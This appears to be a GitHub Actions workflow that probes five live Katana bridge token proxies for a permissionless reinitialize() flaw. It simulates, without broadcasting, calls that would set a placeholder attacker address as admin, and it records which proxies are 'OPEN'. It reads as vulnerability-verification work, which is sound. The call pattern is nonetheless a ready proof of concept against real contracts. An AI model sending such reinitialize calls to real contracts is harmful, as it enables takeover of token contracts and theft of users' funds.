name: Katana CustomToken reinitializer probe

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/katana-customtoken-reinitializer-probe.yml'
      - 'katana-reinit/**'

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - name: Install authenticated Foundry toolchain
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p /tmp/foundry evidence
          curl --fail --location --retry 4 --retry-all-errors \
            https://github.com/foundry-rs/foundry/releases/download/v1.7.1/foundry_v1.7.1_linux_amd64.tar.gz \
            --output /tmp/foundry.tar.gz
          echo 'cf7e688ed0c4c48adffca788b496076e31060b67ac5afe1e43dbb5499c20c88b  /tmp/foundry.tar.gz' \
            | sha256sum --check --strict
          tar -xzf /tmp/foundry.tar.gz -C /tmp/foundry
          echo /tmp/foundry >> "$GITHUB_PATH"

      - name: Simulate permissionless reinitialize calls without broadcasting
        shell: bash
        env:
          RPC_URL: https://rpc.katana.network/
        run: |
          set -euo pipefail
          ATTACKER=0x1111111111111111111111111111111111111111
          BRIDGE=0x2a3dd3eb832af982ec71669e178424b10dca2ede
          : > evidence/probes.txt
          probe() {
            label="$1"; token="$2"; converter="$3"
            name=$(cast call "$token" 'name()(string)' --rpc-url "$RPC_URL")
            symbol=$(cast call "$token" 'symbol()(string)' --rpc-url "$RPC_URL")
            decimals=$(cast call "$token" 'decimals()(uint8)' --rpc-url "$RPC_URL")
            {
              echo "=== $label ==="
              echo "token=$token"
              echo "converter=$converter"
              echo "name=$name"
              echo "symbol=$symbol"
              echo "decimals=$decimals"
              set +e
              out=$(cast call "$token" \
                'reinitialize(address,string,string,uint8,address,address)' \
                "$ATTACKER" "$name" "$symbol" "$decimals" "$BRIDGE" "$converter" \
                --from "$ATTACKER" --rpc-url "$RPC_URL" 2>&1)
              status=$?
              set -e
              echo "exit=$status"
              echo "$out"
              echo
            } >> evidence/probes.txt
          }
          probe USDC 0xfd415D011FfaA8e6f17fa753CdB080d1dE266784 0x97a3500083348a147f419b8a65717909762c389f
          probe USDT 0xf44e3BCB7A2461CC08185E127B324f2486a74E20 0x053fa9b934b83e1e0ffc7e98a41aadc3640bb462
          probe WBTC 0xB33e43A3F276e8e75792b941bccC996EcB2c0bBD 0xb00aa68b87256e2f22058fb2ba3246eec54a44fc
          probe USDS 0x2134866886ce784fE2E0DE819118E4D32b4Be32C 0x639f13d5f30b47c792b6851238c05d0b623c77de
          probe WETH 0x815955d051C6262C16c720b19D735426254Bec5B 0xa6b0db1293144ebe9478b6a84f75dd651e45914a

          python3 - <<'PY'
          from pathlib import Path
          text=Path('evidence/probes.txt').read_text()
          sections=[s for s in text.split('=== ') if s.strip()]
          open_proxies=[]
          for section in sections:
              lines=section.splitlines()
              label=lines[0].strip(' =')
              exit_line=next((x for x in lines if x.startswith('exit=')),None)
              exit_code=int(exit_line.split('=',1)[1]) if exit_line else -1
              if exit_code == 0:
                  open_proxies.append(label)
          verdict='OPEN' if open_proxies else 'CLOSED'
          Path('evidence/verdict.txt').write_text(f'verdict={verdict}\nopen_proxies={open_proxies}\n')
          print(Path('evidence/verdict.txt').read_text())
          PY
          sha256sum evidence/* > evidence/SHA256SUMS

      - name: Upload read-only reinitializer evidence
        uses: actions/upload-artifact@v4
        with:
          name: katana-reinitializer-probe-${{ github.run_id }}
          path: evidence/
          if-no-files-found: error
          retention-days: 1
